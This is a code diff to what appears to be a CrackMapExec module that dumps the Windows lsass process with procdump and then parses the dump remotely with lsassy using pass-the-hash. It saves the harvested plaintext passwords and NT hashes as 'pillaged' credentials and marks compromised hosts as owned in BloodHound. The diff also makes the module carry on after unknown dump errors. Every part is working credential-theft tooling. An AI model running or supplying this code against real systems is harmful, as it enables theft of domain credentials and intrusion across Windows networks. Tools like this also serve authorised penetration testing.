@@ -111,15 +111,14 @@ class CMEModule:
             # Procdump output not fully retrieved
             context.log.debug('Procdump output partially retrieved')
             # Since we cannot know when the dump finishes, we wait for 5s
-            time.sleep(5)
+            time.sleep(2)
         elif 'The version of this file is not compatible' in p or 'Cette version de' in p:
             context.log.error(
                 'Provided procdump executable and target architecture are incompatible (32 bits / 64 bits)'
             )
             return 1
         else:
-            context.log.error('Unknown error while dumping lsass, try CME with --verbose to see details')
-            return 1
+            context.log.debug('Unknown error while dumping lsass, try CME with --verbose to see details. Trying anyway.')
 
         context.log.success("Process lsass.exe was successfully dumped")
 
@@ -137,15 +136,21 @@ class CMEModule:
         nthash = getattr(connection, "nthash", "")
         host = connection.host
 
-        py_arg = "{}/{}:{}@{}:/{}{}".format(
-            domain_name, username, password, host, self.share,
-            os.path.join(self.tmp_dir, self.remote_lsass_dump).replace("\\", "/")
+        py_arg = "{}/{}:{}@{}".format(
+            domain_name, username, password, host
         )
 
-        command = r"lsassy -j --hashes {}:{} '{}'".format(lmhash, nthash, py_arg, self.procdump_path + self.remote_lsass_dump)
+        command = r"lsassy -j -q --hashes {}:{} -p '{}{}' '{}'".format(
+            lmhash,
+            nthash,
+            self.share,
+            os.path.join(self.tmp_dir, self.remote_lsass_dump).replace("\\", "/"),
+            py_arg
+        )
 
         # Parsing lsass dump remotely
         context.log.info('Parsing dump file with lsassy')
+        context.log.debug('Lsassy command : {}'.format(command))
         code, out, err = self.run(command)
 
         if code != 0:
@@ -172,7 +177,8 @@ class CMEModule:
         except Exception as e:
             context.log.error('Error deleting procdump.exe : {}'.format(e))
 
-    def run(self, cmd):
+    @staticmethod
+    def run(cmd):
         proc = subprocess.Popen([
             '/bin/sh', '-c', cmd],
             stdout=subprocess.PIPE,
@@ -193,14 +199,15 @@ class CMEModule:
                     self.save_credentials(context, connection, domain, username, password, lmhash, nthash)
                     self.print_credentials(context, connection, domain, username, password, lmhash, nthash)
 
-    def save_credentials(self, context, connection, domain, username, password, lmhash, nthash):
-        hostid = context.db.get_computers(connection.host)[0][0]
+    @staticmethod
+    def save_credentials(context, connection, domain, username, password, lmhash, nthash):
+        host_id = context.db.get_computers(connection.host)[0][0]
         if password is not None:
-            credtype = 'plaintext'
+            credential_type = 'plaintext'
         else:
-            credtype = 'hash'
+            credential_type = 'hash'
             password = ':'.join(h for h in [lmhash, nthash] if h is not None)
-        context.db.add_credential(credtype, domain, username, password, pillaged_from=hostid)
+        context.db.add_credential(credential_type, domain, username, password, pillaged_from=host_id)
 
     def print_credentials(self, context, connection, domain, username, password, lmhash, nthash):
         if password is None:
@@ -213,7 +220,7 @@ class CMEModule:
     def set_as_owned(self, context, connection):
         from neo4j.v1 import GraphDatabase
         from neo4j.exceptions import AuthError, ServiceUnavailable
-        hostFQDN = (connection.hostname + "." + connection.domain).upper()
+        host_fqdn = (connection.hostname + "." + connection.domain).upper()
         uri = "bolt://{}:{}".format(self.neo4j_URI, self.neo4j_Port)
 
         try:
@@ -232,12 +239,12 @@ class CMEModule:
         with driver.session() as session:
             with session.begin_transaction() as tx:
                 result = tx.run(
-                    "MATCH (c:Computer {{name:\"{}\"}}) SET c.owned=True RETURN c.name AS name".format(hostFQDN))
+                    "MATCH (c:Computer {{name:\"{}\"}}) SET c.owned=True RETURN c.name AS name".format(host_fqdn))
         if len(result.value()) > 0:
-            context.log.success("Node {} successfully set as owned in BloodHound".format(hostFQDN))
+            context.log.success("Node {} successfully set as owned in BloodHound".format(host_fqdn))
         else:
             context.log.error(
-                "Node {} does not appear to be in Neo4J database. Have you imported correct data ?".format(hostFQDN))
+                "Node {} does not appear to be in Neo4J database. Have you imported correct data ?".format(host_fqdn))
         driver.close()
 
     def bloodhound_analysis(self, context, connection, username):
